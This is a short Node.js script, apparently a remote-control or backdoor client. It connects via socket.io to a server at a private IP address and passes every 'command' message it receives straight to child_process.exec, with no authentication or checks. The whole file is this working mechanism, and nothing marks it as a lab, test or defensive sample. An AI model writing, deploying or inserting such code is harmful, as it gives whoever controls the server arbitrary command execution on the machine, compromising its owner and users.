const exec = require('child_process').exec;
const io = require('socket.io-client');
const client = io('http://192.168.0.102:3000')


client.on('command', (data) => {
    exec(data)
})
